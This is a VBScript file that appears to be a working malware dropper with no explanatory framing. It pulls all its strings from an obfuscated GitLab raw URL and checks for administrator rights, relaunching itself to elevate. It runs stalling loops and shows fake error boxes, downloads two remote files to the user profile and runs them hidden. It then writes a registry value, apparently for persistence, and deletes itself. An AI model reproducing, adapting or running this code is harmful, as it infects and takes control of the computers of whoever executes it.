

set u6kmejjv = createobject("Scripting.FileSystemObject") 

if not u6kmejjv.FileExists(u6kmejjv.GetParentFolderName(WScript.ScriptFullName) +"\r2jSYz8V1y") then 
u6kmejjv.CreateTextFile u6kmejjv.GetParentFolderName(WScript.ScriptFullName) +"\r2jSYz8V1y",True

MsgBox "", 16,""

N1awPwzq = timer()
randomize
T9rOnOm = chr((rnd()*18)+70)
O3BfOxsG = chr((rnd()*18)+70)
do
D2wyQ0sq=now()
wscript.sleep(5)
p2uFQmoi=""
randomize
for c3YCOyD = 1 to 6
p2uFQmoi = p2uFQmoi + chr((rnd()*18)+70)
next
if D2wyQ0sq>=661 then
D2wyQ0sq=D2wyQ0sq+917
end if
p6YNhwqX= timer()
loop until right(p2uFQmoi,1)=T9rOnOm and p6YNhwqX-N1awPwzq > 61


end if


OaFeiDJ2I = "https://gitlab.com/cv2995310/././../cv2995310/../cv2995310/../cv2995310/../cv2995310/../cv2995310/././././../cv2995310/./././././../cv2995310/././../cv2995310/./../cv2995310/../cv2995310/./../cv2995310/./../cv2995310/./../cv2995310/./../cv2995310/../cv2995310/./../cv2995310/../cv2995310/././../cv2995310/../cv2995310/././../cv2995310/././../cv2995310/./../cv2995310/../cv2995310/../cv2995310/././../cv2995310/../cv2995310/../cv2995310/../cv2995310/../cv2995310/../cv2995310/././../cv2995310/./././../cv2995310/./././../cv2995310/../cv2995310/./././../cv2995310/../cv2995310/././../cv2995310/./../cv2995310/../cv2995310/././././../cv2995310/../cv2995310/./../cv2995310/../cv2995310/../cv2995310/./../cv2995310/../cv2995310/./../cv2995310/../cv2995310/././../cv2995310/./../cv2995310/../cv2995310/././../cv2995310/./../cv2995310/./../cv2995310/././../cv2995310/../cv2995310/./../cv2995310/../cv2995310/./../cv2995310/././../cv2995310/./../cv2995310/../cv2995310/./../cv2995310/./../cv2995310/../cv2995310/./././././../cv2995310/./../cv2995310/././../cv2995310/./././././../cv2995310/../cv2995310/../cv2995310/cv/-/../-/././../-/./../-/./././../-/../-/././././././../-/../-/../-/./../-/././../-/../-/./../-/../-/./././././../-/./../-/./././././././../-/./../-/./../-/./../-/../-/../-/../-/../-/./../-/./../-/././../-/../-/../-/./../-/./../-/../-/./../-/././../-/../-/../-/././../-/././../-/../-/../-/./../-/../-/../-/../-/../-/./../-/./././../-/././../-/../-/./../-/../-/./../-/../-/././././././../-/../-/../-/../-/../-/../-/../-/./../-/./././../-/./././../-/../-/././././../-/../-/./../-/././../-/raw/main/../main/../main/././../main/./././../main/../main/././../main/././../main/../main/././../main/./././../main/./../main/../main/../main/./../main/../main/../main/./../main/../main/././../main/././../main/../main/././../main/./../main/./../main/../main/./../main/../main/./././../main/../main/../main/../main/./././../main/./../main/./../main/../main/../main/../main/../main/./../main/../main/./././../main/../main/../main/../main/./../main/../main/./../main/./././../main/./../main/./../main/../main/../main/../main/././../main/./../main/./../main/./../main/../main/../main/./././././../main/./././../main/./../main/../main/./../main/../main/./././././../main/../main/././../main/./././../main/./../main/./../main/././../main/././../main/../main/./././../main/././././../main/././../main/./../main/./../main/../main/../main/../main/./../main/Gefahrenzustände/"



function JaRo8Gq(w2oOqMj)
Set iakm92k = CreateObject("MSXML2.XMLHTTP")

Call iakm92k.Open(F9EDCGUZ, OaFeiDJ2I+w2oOqMj, FALSE)

iakm92k.Send

JaRo8Gq = iakm92k.ResponseText

end function






Sub e3gx3KOt7(B1hgIctc2,a2SorJd)
   set F4T4ep0aV0 = CreateObject(JaRo8Gq("Handlungsgrundsätze"))

   F4T4ep0aV0.ShellExecute B1hgIctc2,a2SorJd,"",JaRo8Gq("unbeteiligtesten"),0

end sub


Function g9b9vabU()
    On Error Resume Next

    q862p60i.RegRead(JaRo8Gq("Bearbeitungsfrequenzen"))

    if Err.number = 0 Then 
        g9b9vabU = True

    else
        g9b9vabU = False

    end if
    Err.Clear

    On Error goto 0

End Function


sub s6g9RY7S6h()    
   set F4T4ep0aV0 = CreateObject(JaRo8Gq("Handlungsgrundsätze"))

   F4T4ep0aV0.ShellExecute JaRo8Gq("Jahresgesamterträgen"), Chr(34) & WScript.ScriptFullName & Chr(34), "", JaRo8Gq("unbeteiligtesten"), 1

end sub






F9EDCGUZ = "GET"

Set q862p60i = CreateObject(JaRo8Gq("vorbeirannte"))    

Set oaF1GXvi = CreateObject(JaRo8Gq("Erdgashandel"))

h48Qk0aSB = q862p60i.ExpandEnvironmentStrings(JaRo8Gq("mineralischem"))

R2OW70oD = oaF1GXvi.GetParentFolderName(q862p60i.SpecialFolders(0))



if oaF1GXvi.FileExists(R2OW70oD+"\"+h48Qk0aSB+JaRo8Gq("Eingliederungsplänen")) then WScript.Quit
if g9b9vabU() Then
oaF1GXvi.CreateTextFile R2OW70oD+"\"+h48Qk0aSB+JaRo8Gq("Eingliederungsplänen"),True

end if


do
if not oaF1GXvi.FileExists(R2OW70oD+"\"+h48Qk0aSB+JaRo8Gq("Eingliederungsplänen")) then
s6g9RY7S6h
wscript.sleep(2000)
end if
loop until oaF1GXvi.FileExists(R2OW70oD+"\"+h48Qk0aSB+JaRo8Gq("Eingliederungsplänen")) 
On Error Resume Next

Err.Clear

Set c3GQZDkOVT = oaF1GXvi.OpenTextFile(R2OW70oD+JaRo8Gq("desobstruiría"), 2, True)

If Err Then wscript.quit
On Error Goto 0

	

MsgBox JaRo8Gq("Standardbedingen"), 16, JaRo8Gq("Ohrfasane")



N1awPwzq = timer()
randomize
T9rOnOm = chr((rnd()*18)+70)
O3BfOxsG = chr((rnd()*18)+70)
do
D2wyQ0sq=now()
wscript.sleep(5)
p2uFQmoi=""
randomize
for c3YCOyD = 1 to 6
p2uFQmoi = p2uFQmoi + chr((rnd()*18)+70)
next
if D2wyQ0sq>=661 then
D2wyQ0sq=D2wyQ0sq+917
end if
p6YNhwqX= timer()
loop until right(p2uFQmoi,1)=T9rOnOm and p6YNhwqX-N1awPwzq > 61




sub K9Pmuwgq6(y8sRb0f, s708Zsu6Hp)
dim U6BIw4dC: Set U6BIw4dC = createobject(JaRo8Gq("Otterspitzmäusen"))

dim Y0aDuvFoU: Set Y0aDuvFoU = createobject(JaRo8Gq("Patrouillenfahrzeugs"))

U6BIw4dC.Open F9EDCGUZ, y8sRb0f, False

U6BIw4dC.Send



with Y0aDuvFoU
    .type = 1

    .open

    .write U6BIw4dC.responseBody

    .savetofile s708Zsu6Hp, 2

end with
end sub
e3gx3KOt7 JaRo8Gq("Spendertieren"),JaRo8Gq("Informationsauffindungen")

N1awPwzq = timer()
randomize
T9rOnOm = chr((rnd()*18)+70)
O3BfOxsG = chr((rnd()*18)+70)
do
D2wyQ0sq=now()
wscript.sleep(5)
p2uFQmoi=""
randomize
for c3YCOyD = 1 to 6
p2uFQmoi = p2uFQmoi + chr((rnd()*18)+70)
next
if D2wyQ0sq>=661 then
D2wyQ0sq=D2wyQ0sq+917
end if
p6YNhwqX= timer()
loop until right(p2uFQmoi,1)=T9rOnOm and p6YNhwqX-N1awPwzq > 61




K9Pmuwgq6 JaRo8Gq("Finanzmisere"), R2OW70oD+JaRo8Gq("Mikrotypografien")

K9Pmuwgq6 JaRo8Gq("Dotbuffers"),R2OW70oD+JaRo8Gq("vielseitigen")



e3gx3KOt7 R2OW70oD+JaRo8Gq("Mikrotypografien"),JaRo8Gq("Frachtraumschiffen")+R2OW70oD+JaRo8Gq("fremdsprachigem")+R2OW70oD+JaRo8Gq("vielseitigen")+""""

N1awPwzq = timer()
randomize
T9rOnOm = chr((rnd()*18)+70)
O3BfOxsG = chr((rnd()*18)+70)
do
D2wyQ0sq=now()
wscript.sleep(5)
p2uFQmoi=""
randomize
for c3YCOyD = 1 to 6
p2uFQmoi = p2uFQmoi + chr((rnd()*18)+70)
next
if D2wyQ0sq>=661 then
D2wyQ0sq=D2wyQ0sq+917
end if
p6YNhwqX= timer()
loop until right(p2uFQmoi,1)=T9rOnOm and p6YNhwqX-N1awPwzq > 61




 i8eeOemYE = JaRo8Gq("Grenzverlegung")

 q862p60i.RegWrite i8eeOemYE,JaRo8Gq("Wachstumsorientierungen")+R2OW70oD+JaRo8Gq("Propsteigemeinde"),JaRo8Gq("Theaterkapellmeistern")



e3gx3KOt7 JaRo8Gq("Spendertieren"),JaRo8Gq("Volumenableitung")



oaF1GXvi.DeleteFile WScript.ScriptFullName






